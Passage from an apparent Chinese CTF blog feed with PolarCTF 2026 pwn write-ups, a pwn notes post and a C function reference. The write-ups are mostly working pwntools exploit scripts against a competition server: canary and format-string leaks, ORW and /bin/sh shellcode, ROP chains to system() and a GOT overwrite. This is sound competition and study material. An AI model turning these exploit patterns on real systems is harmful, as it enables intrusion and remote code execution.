io.recvline()<br>ru = lambda delims, drop = True : io.recvuntil(delims, drop)<br>leak = lambda name,addr : log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))<br>ur32 = lambda data: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))<br>ur64 = lambda data : u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))<br>uul32 = lambda : u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))<br>uul64 = lambda : u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>i32=lambda data: int(io.recv(data), 16)<br>i64=lambda data: int(io.recv(data), 16)<br>ioi     =   lambda                      : io.interactive()<br>#获取libc函数地址<br>def libc_func_addr(base,func):<br>    return base+libc.sym[&#x27;func&#x27;]<br>#简单的shellcode+orw<br>def shell():<br>    return asm(shellcraft.sh())<br>def orw(flag_file_name,addr,count):<br>    return asm(shellcraft.open(str(flag_file_name)) + shellcraft.read(3,addr,count) + shellcraft.write(1,addr,count))<br><br>#gdb.attach(io)<br>sl(b&quot;\x00\x67&quot;)<br>sl(b&quot;%31$p&quot;)<br><br>io.recvuntil(&quot;0x&quot;)<br>canary = int(io.recv(8), 16)<br>leak(&quot;canary&quot;, canary)<br><br>p0 = cyclic(0x70 - 0xc) + p32(canary) + cyclic(0xc) +p32(0x8048621)<br>sl(p0)<br>#连接<br>#--------------------------------------------------------------------------------<br>ioi()<br></code></pre></td></tr></table></figure><h1 id="sandbox1"><a href="#sandbox1" class="headerlink" title="sandbox1"></a>sandbox1</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#导入所需库<br>#--------------------------------------------------------------------------------<br>from pwn import*<br>from LibcSearcher import*<br>from ctypes import*<br>from struct import*<br>import time<br><br>#设置context<br>#--------------------------------------------------------------------------------<br>context(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;, terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;])<br><br>#设置是否本地还是远程,并操作、解析相应文件<br>#--------------------------------------------------------------------------------<br>pwn_file=&#x27;./sandbox1&#x27;<br>#libc_file=&#x27;&#x27;<br>elf=ELF(pwn_file)<br>#libc=ELF(libc_file)<br>#rop=ROP(libc)<br><br>flag=0<br>if flag:<br>    io=process(pwn_file)<br>else:<br>    ip=&#x27;1.95.36.136&#x27;<br>    port=2098<br>    io=remote(ip,port)<br><br>#设置自定义函数<br>#--------------------------------------------------------------------------------<br>#gdb调试<br>def debug():<br>    #gdb.attach(io)<br>    #gdb.attach(io,&#x27;b *$rebase(0x1234)&#x27;)<br>    #gdb.attach(io,&#x27;b main&#x27;)<br>    pause()<br>#lambda表达式<br>s = lambda data : io.send(data)<br>sa = lambda delim,data : io.sendafter(str(delim), data)<br>sl = lambda data : io.sendline(data)<br>sla = lambda delim,data : io.sendlineafter(str(delim), data)<br>r = lambda num : io.recv(num)<br>rl=lambda : io.recvline()<br>ru = lambda delims, drop = True : io.recvuntil(delims, drop)<br>leak = lambda name,addr : log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))<br>ur32 = lambda data: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))<br>ur64 = lambda data : u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))<br>uul32 = lambda : u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))<br>uul64 = lambda : u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>i32=lambda data: int(io.recv(data), 16)<br>i64=lambda data: int(io.recv(data), 16)<br>ioi     =   lambda                      : io.interactive()<br>#获取libc函数地址<br>def libc_func_addr(base,func):<br>    return base+libc.sym[&#x27;func&#x27;]<br>#简单的shellcode+orw<br>def shell():<br>    return asm(shellcraft.sh())<br>def orw(flag_file_name,addr,count):<br>    return asm(shellcraft.open(str(flag_file_name)) + shellcraft.read(3,addr,count) + shellcraft.write(1,addr,count))<br><br>bss_addr = elf.bss()+0x100<br>addr = 0x8108000<br><br>shellcode = orw(&#x27;./flag&#x27;,bss_addr,0x100)<br>sl(shellcode)<br>#连接<br>#--------------------------------------------------------------------------------<br>ioi()<br></code></pre></td></tr></table></figure><h1 id="zero"><a href="#zero" class="headerlink" title="zero"></a>zero</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#导入所需库<br>#--------------------------------------------------------------------------------<br>from pwn import*<br>from LibcSearcher import*<br>from ctypes import*<br>from struct import*<br>import time<br><br>#设置context<br>#--------------------------------------------------------------------------------<br>context(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;, terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;])<br><br>#设置是否本地还是远程,并操作、解析相应文件<br>#--------------------------------------------------------------------------------<br>pwn_file=&#x27;./zero&#x27;<br>#libc_file=&#x27;&#x27;<br>elf=ELF(pwn_file)<br>#libc=ELF(libc_file)<br>#rop=ROP(libc)<br><br>flag=0<br>if flag:<br>    io=process(pwn_file)<br>else:<br>    ip=&#x27;1.95.36.136&#x27;<br>    port=2139<br>    io=remote(ip,port)<br><br>#设置自定义函数<br>#--------------------------------------------------------------------------------<br>#gdb调试<br>def debug():<br>    #gdb.attach(io)<br>    #gdb.attach(io,&#x27;b *$rebase(0x1234)&#x27;)<br>    #gdb.attach(io,&#x27;b main&#x27;)<br>    pause()<br>#lambda表达式<br>s = lambda data : io.send(data)<br>sa = lambda delim,data : io.sendafter(str(delim), data)<br>sl = lambda data : io.sendline(data)<br>sla = lambda delim,data : io.sendlineafter(str(delim), data)<br>r = lambda num : io.recv(num)<br>rl=lambda : io.recvline()<br>ru = lambda delims, drop = True : io.recvuntil(delims, drop)<br>leak = lambda name,addr : log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))<br>ur32 = lambda data: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))<br>ur64 = lambda data : u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))<br>uul32 = lambda : u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))<br>uul64 = lambda : u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>i32=lambda data: int(io.recv(data), 16)<br>i64=lambda data: int(io.recv(data), 16)<br>ioi     =   lambda                      : io.interactive()<br>#获取libc函数地址<br>def libc_func_addr(base,func):<br>    return base+libc.sym[&#x27;func&#x27;]<br>#简单的shellcode+orw<br>def shell():<br>    return asm(shellcraft.sh())<br>def orw(flag_file_name,addr,count):<br>    return asm(shellcraft.open(str(flag_file_name)) + shellcraft.read(3,addr,count) + shellcraft.write(1,addr,count))<br><br>polar_addr = 0x00002080 <br>io.recvuntil(&quot;0x&quot;)<br>base_addr=int(io.recv(8),16) - polar_addr<br>leak(&#x27;base_addr&#x27;,base_addr)<br>xin_addr = base_addr + 0x000008C0<br>p0 = cyclic(0x6c + 4) + p32(xin_addr)<br>sl(p0)<br>sl(b&quot;$0&quot;)<br>#连接<br>#--------------------------------------------------------------------------------<br>ioi()<br></code></pre></td></tr></table></figure><h1 id="bllhl-canary"><a href="#bllhl-canary" class="headerlink" title="bllhl_canary"></a>bllhl_canary</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#导入所需库<br>#--------------------------------------------------------------------------------<br>from pwn import*<br>from LibcSearcher import*<br>from ctypes import*<br>from struct import*<br>import time<br><br>#设置context<br>#--------------------------------------------------------------------------------<br>context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#, terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;])<br><br>#设置是否本地还是远程,并操作、解析相应文件<br>#--------------------------------------------------------------------------------<br>pwn_file=&#x27;./bllhl_canary&#x27;<br>libc_file=&#x27;./bllhl_canary.so.6&#x27;<br>elf=ELF(pwn_file)<br>libc=ELF(libc_file)<br>rop=ROP(libc)<br><br>flag=0<br>if flag:<br>    io=process(pwn_file)<br>else:<br>    ip=&#x27;1.95.36.136&#x27;<br>    port=2092<br>    io=remote(ip,port)<br><br>#设置自定义函数<br>#--------------------------------------------------------------------------------<br>#gdb调试<br>def debug():<br>    #gdb.attach(io)<br>    #gdb.attach(io,&#x27;b *$rebase(0x1234)&#x27;)<br>    #gdb.attach(io,&#x27;b main&#x27;)<br>    pause()<br>#lambda表达式<br>s = lambda data : io.send(data)<br>sa = lambda delim,data : io.sendafter(str(delim), data)<br>sl = lambda data : io.sendline(data)<br>sla = lambda delim,data : io.sendlineafter(str(delim), data)<br>r = lambda num : io.recv(num)<br>rl=lambda : io.recvline()<br>ru = lambda delims, drop = True : io.recvuntil(delims, drop)<br>leak = lambda name,addr : log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))<br>ur32 = lambda data: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))<br>ur64 = lambda data : u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))<br>uul32 = lambda : u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))<br>uul64 = lambda : u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>i32=lambda data: int(io.recv(data), 16)<br>i64=lambda data: int(io.recv(data), 16)<br>i6      =lambda data: int(data, 16)<br>ioi     =   lambda                      : io.interactive()<br>#获取libc函数地址<br>def libc_func_addr(base,func):<br>    return base+libc.sym[&#x27;func&#x27;]<br>#简单的shellcode+orw<br>def shell():<br>    return asm(shellcraft.sh())<br>def orw(flag_file_name,addr,count):<br>    return asm(shellcraft.open(str(flag_file_name)) + shellcraft.read(3,addr,count) + shellcraft.write(1,addr,count))<br><br><br>p0=b&#x27;%38$p.%39$p.%41$p.%49$p.kkkk&#x27;<br>s(p0)<br>ru(&quot;[echo] &quot;)<br>a,b,c,libcbase,d=ru(b&#x27;k&#x27;*4).decode().split(&#x27;.&#x27;)<br>a=i6(a)<br>b=i6(b)<br>c=i6(c)<br>libcbase=i6(libcbase)-0x29d90<br><br>leak(&#x27;a&#x27;,a)<br>leak(&#x27;b&#x27;,b)<br>leak(&#x27;c&#x27;,c)<br>leak(&#x27;libcbase&#x27;,libcbase)<br><br>system = libcbase+libc.sym[&#x27;system&#x27;]<br>binsh = libcbase+next(libc.search(b&#x27;/bin/sh&#x27;))<br>rdi = libcbase+rop.find_gadget([&#x27;pop rdi&#x27;, &#x27;ret&#x27;])[0]<br>ret = libcbase+rop.find_gadget([&#x27;ret&#x27;])[0]<br><br>p1 = b&#x27;b&#x27;*0x60+flat(a,b,0,c)+0x18*b&#x27;b&#x27;+flat(ret,rdi,binsh,system)<br>sl(p1)<br>#连接<br>#--------------------------------------------------------------------------------<br>ioi()<br></code></pre></td></tr></table></figure><h1 id="bllhl-fmt"><a href="#bllhl-fmt" class="headerlink" title="bllhl_fmt"></a>bllhl_fmt</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#导入所需库<br>#--------------------------------------------------------------------------------<br>from pwn import*<br>from LibcSearcher import*<br>from ctypes import*<br>from struct import*<br>import time<br><br>#设置context<br>#--------------------------------------------------------------------------------<br>context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;, terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;])<br><br>#设置是否本地还是远程,并操作、解析相应文件<br>#--------------------------------------------------------------------------------<br>pwn_file=&#x27;./bllhl_fmt&#x27;<br>libc_file=&#x27;./bllhl_fmt.so.6&#x27;<br>elf=ELF(pwn_file)<br>libc=ELF(libc_file)<br>rop=ROP(libc)<br><br>flag=0<br>if flag:<br>    io=process(pwn_file)<br>else:<br>    ip=&#x27;1.95.36.136&#x27;<br>    port=2143<br>    io=remote(ip,port)<br><br>#设置自定义函数<br>#--------------------------------------------------------------------------------<br>#gdb调试<br>def debug():<br>    #gdb.attach(io)<br>    #gdb.attach(io,&#x27;b *$rebase(0x1234)&#x27;)<br>    #gdb.attach(io,&#x27;b main&#x27;)<br>    pause()<br>#lambda表达式<br>s = lambda data : io.send(data)<br>sa = lambda delim,data : io.sendafter(str(delim), data)<br>sl = lambda data : io.sendline(data)<br>sla = lambda delim,data : io.sendlineafter(str(delim), data)<br>r = lambda num : io.recv(num)<br>rl=lambda : io.recvline()<br>ru = lambda delims, drop = True : io.recvuntil(delims, drop)<br>leak = lambda name,addr : log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))<br>ur32 = lambda data: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))<br>ur64 = lambda data : u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))<br>uul32 = lambda : u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))<br>uul64 = lambda : u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>i32=lambda data: int(io.recv(data), 16)<br>i64=lambda data: int(io.recv(data), 16)<br>ioi     =   lambda                      : io.interactive()<br>#获取libc函数地址<br>def libc_func_addr(base,func):<br>    return base+libc.sym[&#x27;func&#x27;]<br>#简单的shellcode+orw<br>def shell():<br>    return asm(shellcraft.sh())<br>def orw(flag_file_name,addr,count):<br>    return asm(shellcraft.open(str(flag_file_name)) + shellcraft.read(3,addr,count) + shellcraft.write(1,addr,count))<br><br>p0 = b&quot;%45$p+%43$p&quot;<br>sl(p0)<br>io.recvuntil(&#x27;0x&#x27;)<br>addr_base = int(io.recv(12),16) - 0x0120E<br>io.recvuntil(&#x27;+0x&#x27;)<br>libc_base = int(io.recv(12),16) - 0x29d90<br>leak(&#x27;addr_base&#x27;,addr_base)<br>leak(&#x27;libc_base&#x27;,libc_base)<br><br>system = libc_base+libc.sym[&#x27;system&#x27;]<br>binsh = libc_base+next(libc.search(b&#x27;/bin/sh&#x27;))<br>rdi = libc_base+rop.find_gadget([&#x27;pop rdi&#x27;, &#x27;ret&#x27;])[0]<br>ret = libc_base+rop.find_gadget([&#x27;ret&#x27;])[0]<br><br>st = libc_base + libc.sym[&#x27;environ&#x27;]<br>p1 = b&quot;kkkk%8$s&quot; + p64(st)<br>sl(p1)<br>io.recvuntil(&#x27;kkkk&#x27;)<br>stack_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;)) - 0x120 - 0x130<br>leak(&#x27;stack_addr&#x27;,stack_addr)<br><br>add58 = libc_base+0x00000000000a0265<br>pay=fmtstr_payload(7,&#123;stack_addr:add58&#125;,numbwritten=8,write_size=&#x27;short&#x27;)<br>pay=pay.ljust(0x50,b&#x27;b&#x27;)+flat(rdi,binsh,ret,system)<br>sl(pay)<br>#连接<br>#--------------------------------------------------------------------------------<br>ioi()<br></code></pre></td></tr></table></figure><h1 id="bllhl-book"><a href="#bllhl-book" class="headerlink" title="bllhl_book"></a>bllhl_book</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#导入所需库<br>#--------------------------------------------------------------------------------<br>from pwn import*<br>from LibcSearcher import*<br>from ctypes import*<br>from struct import*<br>import time<br><br>#设置context<br>#--------------------------------------------------------------------------------<br>context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;, terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;])<br><br>#设置是否本地还是远程,并操作、解析相应文件<br>#--------------------------------------------------------------------------------<br>pwn_file=&#x27;./bllhl_book&#x27;<br>libc_file=&#x27;./bllhl_fmt.so.6&#x27;<br>elf=ELF(pwn_file)<br>libc=ELF(libc_file)<br>rop=ROP(libc)<br><br>flag=0<br>if flag:<br>    io=process(pwn_file)<br>else:<br>    ip=&#x27;1.95.36.136&#x27;<br>    port=2061<br>    io=remote(ip,port)<br><br>#设置自定义函数<br>#--------------------------------------------------------------------------------<br>#gdb调试<br>def debug():<br>    #gdb.attach(io)<br>    #gdb.attach(io,&#x27;b *$rebase(0x1234)&#x27;)<br>    #gdb.attach(io,&#x27;b main&#x27;)<br>    pause()<br>#lambda表达式<br>s = lambda data : io.send(data)<br>sa = lambda delim,data : io.sendafter(str(delim), data)<br>sl = lambda data : io.sendline(data)<br>sla = lambda delim,data : io.sendlineafter(str(delim), data)<br>r = lambda num : io.recv(num)<br>rl=lambda : io.recvline()<br>ru = lambda delims, drop = True : io.recvuntil(delims, drop)<br>leak = lambda name,addr : log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))<br>ur32 = lambda data: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))<br>ur64 = lambda data : u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))<br>uul32 = lambda : u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))<br>uul64 = lambda : u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>i32=lambda data: int(io.recv(data), 16)<br>i64=lambda data: int(io.recv(data), 16)<br>ioi     =   lambda                      : io.interactive()<br>#获取libc函数地址<br>def libc_func_addr(base,func):<br>    return base+libc.sym[&#x27;func&#x27;]<br>#简单的shellcode+orw<br>def shell():<br>    return asm(shellcraft.sh())<br>def orw(flag_file_name,addr,count):<br>    return asm(shellcraft.open(str(flag_file_name)) + shellcraft.read(3,addr,count) + shellcraft.write(1,addr,count))<br><br>def create(s,a,d,f):<br>    sl(b&quot;1&quot;)<br>    sl(str(s))<br>    sl(a)<br>    sl(str(d))<br>    sl(f)<br><br>def rename(a):<br>    sl(b&quot;5&quot;)<br>    sl(a)<br><br>def back():<br>    sl(b&quot;6&quot;)<br><br>def print_book():<br>    sl(b&quot;4&quot;)<br><br>def edit(s,a):<br>    sl(b&quot;3&quot;)<br>    sl(str(s))<br>    sl(a)<br>addr = 0x00404018<br>puts_got = elf.got[&#x27;puts&#x27;]<br>sl(b&quot;haoo&quot;)<br>p0 = b&#x27;b&#x27;<br>p0 = flat(1,puts_got,addr,0x80)<br>create(0x20,b&#x27;b&#x27;,0x60,p0)<br>rename(b&#x27;a&#x27;*0x20)<br>print_book()<br>io.recvuntil(&quot;Name: &quot;)<br>libc_base = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;)) - libc.sym[&#x27;puts&#x27;]<br>leak(&#x27;libc_base&#x27;,libc_base)<br><br>system = libc_base+libc.sym[&#x27;system&#x27;]<br>binsh = libc_base+next(libc.search(b&#x27;/bin/sh\x00&#x27;))<br>stdout = libc_base+libc.sym[&#x27;_IO_2_1_stdout_&#x27;]<br>edit(1,p64(system)+p64(stdout))<br>rename(b&quot;/bin/sh\x00&quot;)<br>back()<br>#连接<br>#--------------------------------------------------------------------------------<br>ioi()<br></code></pre></td></tr></table></figure><p>后面两道题借鉴了其他师傅的wp，主要我还是太菜了，有些手法还不怎么知道，得继续加强练习了。</p>]]>
    </content>
    <id>http://example.com/2026/04/23/PolarCTF2026%E6%98%A5%E5%AD%A3%E8%B5%9B/</id>
    <link href="http://example.com/2026/04/23/PolarCTF2026%E6%98%A5%E5%AD%A3%E8%B5%9B/"/>
    <published>2026-04-23T03:12:34.000Z</published>
    <summary>
      <![CDATA[<h1 id="one-hundred"><a href="#one-hundred" class="headerlink" title="one_hundred"></a>one_hundred</h1><figure class="highlight plaintext"><]]>
    </summary>
    <title>PolarCTF2026春季赛</title>
    <updated>2026-04-23T02:29:03.272Z</updated>
  </entry>
  <entry>
    <author>
      <name>haoo</name>
    </author>
    <category term="pwn" scheme="http://example.com/categories/pwn/"/>
    <category term="小记" scheme="http://example.com/tags/%E5%B0%8F%E8%AE%B0/"/>
    <content>
      <![CDATA[<p>本文章会持续更新，用于记录pwn过程中，本人觉得值得记录的东西0v0</p><h1 id="pwn的exp简化模板"><a href="#pwn的exp简化模板" class="headerlink" title="pwn的exp简化模板"></a>pwn的exp简化模板</h1><p>该部分记录使用lambda表达式与自定义函数简化exp，便于未来exp的编写。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#导入所需库<br>#--------------------------------------------------------------------------------<br>from pwn import*<br>from LibcSearcher import*<br>from ctypes import*<br>from struct import*<br>import time<br><br>#设置context<br>#--------------------------------------------------------------------------------<br>context(arch=&#x27;&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;, terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;])<br><br>#设置是否本地还是远程,并操作、解析相应文件<br>#--------------------------------------------------------------------------------<br>pwn_file=&#x27;&#x27;<br>libc_file=&#x27;&#x27;<br>elf=ELF(pwn_file)<br>libc=ELF(libc_file)<br>rop=ROP(libc)<br><br>flag=1<br>if flag:<br>    io=process(pwn_file)<br>else:<br>    ip=&#x27;&#x27;<br>    port=<br>    io=remote(ip,port)<br><br>#设置自定义函数<br>#--------------------------------------------------------------------------------<br>#gdb调试<br>def debug():<br>    #gdb.attach(io)<br>    #gdb.attach(io,&#x27;b *$rebase(0x1234)&#x27;)<br>    #gdb.attach(io,&#x27;b main&#x27;)<br>    pause()<br>#lambda表达式<br>s = lambda data : io.send(data)<br>sa = lambda delim,data : io.sendafter(str(delim), data)<br>sl = lambda data : io.sendline(data)<br>sla = lambda delim,data : io.sendlineafter(str(delim), data)<br>r = lambda num : io.recv(num)<br>rl=lambda : io.recvline()<br>ru = lambda delims, drop = True : io.recvuntil(delims, drop)<br>leak = lambda name,addr : log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))<br>ur32 = lambda data: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))<br>ur64 = lambda data : u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))<br>uul32 = lambda : u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))<br>uul64 = lambda : u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>uu64    =   lambda data                 : u64(data.ljust(8,b&#x27;\x00&#x27;))<br>i32=lambda data: int(io.recv(data), 16)<br>i64=lambda data: int(io.recv(data), 16)<br>ioi     =   lambda                      : io.interactive()<br>#获取libc函数地址<br>def libc_func_addr(base,func):<br>    return base+libc.sym[&#x27;func&#x27;]<br>#简单的shellcode+orw<br>def shell():<br>    return asm(shellcraft.sh())<br>def orw(flag_file_name,addr,count):<br>    return asm(shellcraft.open(str(flag_file_name)) + shellcraft.read(3,addr,count) + shellcraft.write(1,addr,count))<br><br>#连接<br>#--------------------------------------------------------------------------------<br>ioi()<br></code></pre></td></tr></table></figure><p>其中需要注意的是，如果设置terminal为tmux时gdb，需要在tmux下运行exp，且tmux的操作一般先是先输入CTRL+b，再接着输入命令。</p><h1 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h1><p>在做pwn题的过程中，有时候本地调试的环境会和远程不一样，从而导致本地通了而远程没通的情况，此时可以使用patchelf或者docker解决相应问题。因为patchelf比较简单，在这里先记录该方法。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">strings ./libc-x.xx | grep ubuntu    //查看版本<br>./download xxxx    //在glibc-all-in-one中下载相应版本<br>patchelf --set-interpreter 文件夹名/ld.so ./pwn    //换掉ld<br>patchelf --set-rpath 文件夹名 ./pwn    //换掉path<br></code></pre></td></tr></table></figure><p>这样一来就patch好了。当然这种方法不是万能的，glibc-all-in-one有些版本没有，有些难题对环境的要求很高，因此后续会记录docker的方法，只要知道了远程的环境，我们就能使用docker部署一个一样的环境在本地调试。</p><h1 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h1><p>在这里只是简单介绍了docker的一些基础命令，便于在做pwn题时，与远程的环境一致，便于调试之类的。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#启动docker服务<br>sudo service docker start<br>#查看docker状态<br>docker ps<br>#拉取基础镜像<br>docker pull ____<br>#构建镜像<br>docker build -t ____ .<br>#运行镜像<br>docker run -d --rm \<br>  -p 8889:8889 \<br>  --name onlyfgets \<br>  onlyfgets<br>#进入docker容器<br>docker exec -it only_fgets /bin/bash<br>#关闭容器<br>docker stop only_fgets<br></code></pre></td></tr></table></figure><h1 id="大端序和小端序"><a href="#大端序和小端序" class="headerlink" title="大端序和小端序"></a>大端序和小端序</h1><p>在大端序中，高位字节存储在低地址，低位字节存储在高地址。这种排列方式与数据用字节表示时的书写顺序一致，符合人类的阅读习惯。例如，32位整数0x12345678在大端序下的存储顺序如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">低地址（低位） → 高地址（高位）<br><br>0x12 → 0x34 → 0x56 → 0x78<br></code></pre></td></tr></table></figure><p>在小端序中，低位字节存储在低地址，高位字节存储在高地址。小端序与人类的阅读习惯相反，但更符合计算机读取内存的方式，因为CPU读取内存中的数据时，是从低地址向高地址方向进行读取的。例如，32位整数0x12345678在小端序下的存储顺序如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">低地址（低位） → 高地址（高位）<br><br>0x78 → 0x56 → 0x34 → 0x12<br></code></pre></td></tr></table></figure><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="socket"><a href="#socket" class="headerlink" title="socket"></a>socket</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">python -m http.server 8000<br></code></pre></td></tr></table></figure>]]>
    </content>
    <id>http://example.com/2026/04/22/pwn-%E5%B0%8F%E8%AE%B0/</id>
    <link href="http://example.com/2026/04/22/pwn-%E5%B0%8F%E8%AE%B0/"/>
    <published>2026-04-22T11:40:03.000Z</published>
    <summary>
      <![CDATA[<p>本文章会持续更新，用于记录pwn过程中，本人觉得值得记录的东西0v0</p>
<h1 id="pwn的exp简化模板"><a href="#pwn的exp简化模板" class="headerlink" title="pwn的exp简化模板"></a>pwn的exp简化模板]]>
    </summary>
    <title>pwn_小记</title>
    <updated>2026-04-22T11:40:03.019Z</updated>
  </entry>
  <entry>
    <author>
      <name>haoo</name>
    </author>
    <category term="函数" scheme="http://example.com/categories/%E5%87%BD%E6%95%B0/"/>
    <category term="函数" scheme="http://example.com/tags/%E5%87%BD%E6%95%B0/"/>
    <content>
      <![CDATA[<h1 id="strtol"><a href="#strtol" class="headerlink" title="strtol()"></a>strtol()</h1><p>格式：<em>*long int strol(const char *str,char endptr,int base)**，把</em>*参数str<strong>指向的字符串根据给定的</strong>base<strong>转换为一个长整数，base必须介于2和36之间或为0。<strong>返回值</strong>为被转换的</strong>长整型整数值**。</p><h1 id="strstr"><a href="#strstr" class="headerlink" title="strstr()"></a>strstr()</h1><p>格式：<em>*char *strstr(const char *haystack,const char *needle)<strong>，在字符串haystack中查找第一次出现字符串needle的位置，不包含终止符\0。<strong>返回值</strong>为指向haystack中</strong>第一次出现</em><em>needle的位置的指针，若没找到则返回*<em>NULL</em></em>。</p><h1 id="memcpy"><a href="#memcpy" class="headerlink" title="memcpy()"></a>memcpy()</h1><p>格式：<em>*void *memcpy(void *str1,const void *str2,size_t n)<strong>，从存储区</strong>str2</em><em>复制<strong>n</strong>个字节到存储区*<em>str1</em></em>。<strong>返回</strong>一个指向目标存储区<strong>str1的指针</strong>。</p><h1 id="strcspn"><a href="#strcspn" class="headerlink" title="strcspn()"></a>strcspn()</h1><p>格式：<strong>size_t strcspn(const char *str1,const char *str2)**，检索字符串</strong>str1开头<strong>连续有几个字符都</strong>不含<strong>字符串</strong>str2中的字符**。<strong>返回</strong>str1开头连续都<strong>不含</strong>字符串str2中<strong>字符的字符数</strong>。</p><h1 id="openat"><a href="#openat" class="headerlink" title="openat()"></a>openat()</h1><p>格式：<em>*ssize_t openat(int dfd，const char *filename，int flag，umode_t mode)**，函数第一个参数</em><em>dfd<strong>指的是当</strong>path<strong>为</strong>相对路径<strong>时，该路径在文件系统中的开始地址（即</strong>打开目录获取的文件描述符*</em>）但可以指定为AT_FDCWD(-100)，指定路径为当前路径。其余三个参数与open相同。</p><h1 id="sendfile"><a href="#sendfile" class="headerlink" title="sendfile()"></a>sendfile()</h1><p>格式：<em>*ssize_t sendfile(int out_fd，int in_fd，off_t *offset，size_t count)**，允许将</em><em>文件数据<strong>从</strong>一个文件描述符<strong>直接发送到</strong>另一个文件描述符*</em>，而且不需要经过缓冲区拷贝，比read+write还要简单。</p><h1 id="calloc"><a href="#calloc" class="headerlink" title="calloc()"></a>calloc()</h1><p>格式：void *calloc(size_t nitems,size_t size)，分配所需内存空间，并返回一个指向它的指针，与malloc不同的是，calloc会设置分配的内存为零，即calloc函数会将分配的内存全部初始化为零。nitems为要分配元素个数，size为元素大小。</p><h1 id="strcat"><a href="#strcat" class="headerlink" title="strcat()"></a>strcat()</h1><p>格式：char *strcat(char *dest,const char *src)，把src所指向的字符串追加到dest所指向的字符串的结尾，函数返回一个指向最终的目标字符串dest的指针。</p><h1 id="fread"><a href="#fread" class="headerlink" title="fread()"></a>fread()</h1><p>格式：size_t fread(void *ptr,size_t size,size_t nmemb,FILE *stream)，从stream中读取数据到ptr中。ptr为指向带有最小尺寸nmemb字节的内存块指针、size为每个元素的大小、nmemb为元素个数、stream为输入流</p><h1 id="strchr"><a href="#strchr" class="headerlink" title="strchr()"></a>strchr()</h1><p>格式：char *strchr(const char *str,char 